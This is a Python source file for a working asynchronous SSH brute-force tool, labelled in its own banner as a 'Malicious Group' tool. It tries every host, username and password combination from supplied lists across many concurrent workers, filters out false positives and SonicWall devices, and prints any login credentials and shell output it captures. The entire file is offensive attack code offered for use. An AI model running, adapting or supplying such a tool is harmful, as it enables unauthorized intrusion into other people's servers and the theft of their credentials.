#!/usr/bin/env python

import itertools
import asyncssh
import argparse
import logging
import asyncio
import socket
import random
import time

from sys import argv
from pathlib import Path

log = logging.basicConfig(format='ssh 🠖 %(message)s', level=logging.CRITICAL, stream=None)


class SSH:

    def __init__(self, hf, uf, pf, workers):
        self._hf = self._return_list(hf)
        self._uf = self._return_list(uf)
        self._pf = self._return_list(pf)
        self._workers = int(workers)

        self._fp_user = ['notauser', 'b6ADfjo97sg']
        self._fp_pass = ['notapass', 'b6ADfjo97sg']

        self._found_list = list()
        self._retry_list = list()
        self.ignore_list = list()
        self.credentials = list()
        self.queue_size = 0

    @staticmethod
    def _return_list(item):
        stub = []
        config = Path(item)
        if config.is_file():
            [stub.append(x.rstrip()) for x in open(item) if x]
        else:
            stub.append(str(item).rstrip())
        return stub

    @staticmethod
    async def time_sleep(t):
        await asyncio.sleep(t)

    async def producer(self, queue: asyncio.Queue):
        items = list(itertools.product(self._hf, self._uf, self._pf))
        random.shuffle(items)
        false_positive = list(itertools.product(self._hf, self._fp_user, self._fp_pass))
        [items.insert(0, x) for x in false_positive]
        [queue.put_nowait((h, u, p)) for h, u, p in items if h]

    async def consumer(self, queue: asyncio.Queue):
        while True:
            h, u, p = queue.get_nowait()
            if h in self.ignore_list:
                queue.task_done()
                continue
            self.queue_size = queue.qsize()
            print(f"Queue Size: {queue.qsize()} - Attempting {h:16} - {u} - {p}                             \r", end='')
            try:
                port = int(h.split(':')[1])
            except IndexError:
                port = 22
            while True:
                try:
                    with (await asyncio.wait_for(asyncssh.connect(
                            h,
                            username=u,
                            password=p,
                            port=port,
                            known_hosts=None), timeout=6)) as conn:
                        stdin, stdout, stderr = await conn.open_session(term_type='ansi')
                        output = await stdout.read(2048)
                        if "sonicwall" in output.lower():
                            if h not in self.ignore_list:
                                self.ignore_list.append(h)
                            break
                        await self.time_sleep(0.25)
                        print(f" 🠖 Credentials Found: {h:16} - ({u}:{p})                                              ")
                        print(f" 🠖 Captured Output: {output}\n\n")
                        self.credentials.append({h: [u, p], '\noutput': output})
                except asyncssh.CompressionError:
                    break
                except asyncssh.PermissionDenied:
                    break
                except asyncssh.ConnectionLost:
                    self._retry_list.append(h)
                    if self._retry_list.count(h) >= 10:
                        if h not in self.ignore_list:
                            self.ignore_list.append(h)
                    else:
                        queue.put_nowait((h, u, p))
                    break
                except asyncssh.channel.ChannelOpenError:
                    break
                except asyncssh.Error:
                    break
                except asyncssh.ProtocolError:
                    break
                except (asyncio.TimeoutError, TimeoutError):
                    break
                except socket.timeout:
                    self._retry_list.append(h)
                    if self._retry_list.count(h) >= 10:
                        if h not in self.ignore_list:
                            self.ignore_list.append(h)
                    else:
                        queue.put_nowait((h, u, p))
                    break
                except Exception:
                    break
                finally:
                    queue.task_done()
                break

    async def main(self):
        workers = self._workers
        queue = asyncio.Queue()
        producers = [asyncio.create_task(self.producer(queue))]
        consumers = [asyncio.create_task(self.consumer(queue)) for _ in range(workers)]
        await asyncio.gather(*producers)
        await queue.join()
        for c in consumers:
            c.cancel()


def usage():
    u = f"""
    USAGE:
      {argv[0]} -h "192.168.1.1" -u "admin" -p /path/passwords.txt
      {argv[0]} -h "192.168.1.1:2222" -u "admin" -p /path/passwords.txt
      {argv[0]} -h /path/hosts.txt -u /path/users.txt -p /path/passwords.txt
      {argv[0]} -h /path/hosts.txt -u /path/users.txt -p /path/passwords.txt -w 20

    OPTIONS:
      '-h', '--hosts'      - Set the hostname or path to file containing hostnames.
      '-u', '--users'      - Set the username or path to file containing users.
      '-p', '--passwords'  - Set the password or path to file containing passwords.
      '-w', '--workers'    - Set the number of workers to run during attempts.

    """
    print(u)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(add_help=False, usage=usage)
    parser.add_argument('-h', '--host', action='store', dest='hosts', default='')
    parser.add_argument('-u', '--users', action='store', dest='users', default='')
    parser.add_argument('-p', '--passwords', action='store', dest='passwords', default='')
    parser.add_argument('-w', '--workers', action='store', dest='workers', default=10)
    arg = None

    try:
        arg = parser.parse_args()
    except TypeError:
        usage()
        exit('Invalid Options provided... Exiting.')

    if not arg.hosts or not arg.users or not arg.passwords:
        usage()
        exit('Required Options missing... Exiting.')

    start = time.process_time()
    print(f"\n[ Malicious Group's Asynchronous SSH Bruteforce Tool ]\n")

    aiossh = SSH(arg.hosts, arg.users, arg.passwords, arg.workers)

    asyncio.run(aiossh.main())

    elapsed_time = time.process_time() - start
    print(f"\n[ {arg.workers} workers completed in {elapsed_time} seconds ]")
    print(f"- Credentials: ")
    for cred in aiossh.credentials:
        print(cred)
